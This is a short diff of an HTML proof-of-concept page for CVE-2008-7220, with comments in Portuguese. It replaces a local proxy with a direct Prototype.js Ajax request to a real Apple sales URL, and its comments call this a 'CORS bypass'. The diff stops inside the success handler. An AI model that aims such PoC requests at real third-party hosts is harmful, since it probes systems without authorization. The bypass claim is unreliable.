@@ -1,18 +1,18 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-    <title>CVE-2008-7220 PoC com Proxy</title>
+    <title>CVE-2008-7220 PoC sem Proxy</title>
 </head>
 <body>
-    <h1>CVE-2008-7220 PoC com Proxy</h1>
+    <h1>CVE-2008-7220 PoC sem Proxy</h1>
 
-    <!-- Carrega o Prototype.js através do proxy -->
+    <!-- Carrega o Prototype.js localmente ou de um CDN -->
     <script type="text/javascript" src="/prototype.js"></script>
 
     <script type="text/javascript">
-    var url = 'api/proxy';  // URL do novo proxy em Node.js
+    var url = 'https://sales.apple.com/home';  // URL com bypass de CORS
 
-    // Faz a solicitação AJAX para o proxy, que encaminhará para o servidor de destino
+    // Faz a solicitação AJAX para o servidor de destino diretamente (bypass de CORS)
     new Ajax.Request(url, {
         method: 'get',
         onSuccess: function(transport) {
